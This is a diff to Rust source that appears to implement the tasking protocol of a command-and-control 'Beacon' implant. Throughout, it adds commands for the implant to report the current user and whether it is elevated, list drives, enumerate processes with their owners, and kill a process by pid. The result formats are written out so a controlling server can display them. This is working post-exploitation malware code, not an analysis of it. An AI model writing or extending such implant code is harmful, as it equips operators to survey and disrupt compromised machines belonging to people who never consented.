@@ -122,6 +122,10 @@ pub const COMMAND_MKDIR: u32 = 27;
 pub const COMMAND_RM: u32 = 17;
 pub const COMMAND_COPY: u32 = 12;
 pub const COMMAND_MV: u32 = 18;
+pub const COMMAND_GETUID: u32 = 22;
+pub const COMMAND_DISKS: u32 = 15;
+pub const COMMAND_PS_LIST: u32 = 41;
+pub const COMMAND_PS_KILL: u32 = 42;
 /// Beacon-side error report: `{COMMAND_ERROR, win32 error code}`.
 pub const COMMAND_ERROR: u32 = 0x1111_FFFF;
 
@@ -163,6 +167,14 @@ pub enum Task {
         dst_len: u16,
         dst: [u8; PATH_CAP],
     },
+    /// `COMMAND_GETUID`: the current token's identity.
+    Getuid,
+    /// `COMMAND_DISKS`: the mounted drives.
+    Disks,
+    /// `COMMAND_PS_LIST`: the process listing.
+    PsList,
+    /// `COMMAND_PS_KILL` with the target pid.
+    PsKill { pid: u32 },
 }
 
 impl Task {
@@ -277,6 +289,13 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
                 }
             }
         }
+        COMMAND_GETUID => Task::Getuid,
+        COMMAND_DISKS => Task::Disks,
+        COMMAND_PS_LIST => Task::PsList,
+        COMMAND_PS_KILL => {
+            let pid = r.u32_le()?;
+            Task::PsKill { pid }
+        }
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -312,6 +331,68 @@ pub fn push_rm_result(w: &mut Writer, task_id: u32, was_dir: bool) -> bool {
 /// CP/MV result: the header alone — the server renders the fixed message.
 pub fn push_plain_result(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
     push_result_header(w, task_id, command_id)
+}
+
+/// GETUID result: `byte elevated || array domain || array username` —
+/// the server renders `You are 'DOMAIN\user'` (plus `(elevated)`).
+pub fn push_getuid_result(
+    w: &mut Writer,
+    task_id: u32,
+    elevated: bool,
+    domain: &[u8],
+    username: &[u8],
+) -> bool {
+    push_result_header(w, task_id, COMMAND_GETUID)
+        && w.u8(u8::from(elevated))
+        && w.array(domain)
+        && w.array(username)
+}
+
+/// DISKS result header: `byte 1 || int count`, entries follow.
+pub fn push_disks_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_DISKS) && w.u8(1) && w.u32(count)
+}
+
+/// One DISKS entry: `byte driveLetter || int driveType` (2 USB, 3 disk,
+/// 4 network, 5 CD-ROM).
+pub fn push_disks_entry(w: &mut Writer, letter: u8, drive_type: u32) -> bool {
+    w.u8(letter) && w.u32(drive_type)
+}
+
+/// PS_LIST result header: `byte 1 || int count`, entries follow.
+pub fn push_ps_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_PS_LIST) && w.u8(1) && w.u32(count)
+}
+
+/// One PS_LIST entry (words are the native 16-bit truncation of pids).
+pub struct PsEntry<'a> {
+    pub pid: u32,
+    pub ppid: u32,
+    pub session: u32,
+    /// 0 x32, 1 x64, anything else unknown.
+    pub arch: u8,
+    pub elevated: bool,
+    pub domain: &'a [u8],
+    pub username: &'a [u8],
+    pub name: &'a [u8],
+}
+
+/// `word pid || word ppid || word session || byte arch || byte elevated
+/// || array domain || array username || array processName`.
+pub fn push_ps_entry(w: &mut Writer, e: &PsEntry) -> bool {
+    w.u16(e.pid as u16)
+        && w.u16(e.ppid as u16)
+        && w.u16(e.session as u16)
+        && w.u8(e.arch)
+        && w.u8(u8::from(e.elevated))
+        && w.array(e.domain)
+        && w.array(e.username)
+        && w.array(e.name)
+}
+
+/// PS_KILL result: `int pid` — the server renders `Process %d killed`.
+pub fn push_ps_kill_result(w: &mut Writer, task_id: u32, pid: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_PS_KILL) && w.u32(pid)
 }
 
 /// Result record header: `u32 BE taskId || u32 BE commandId`.
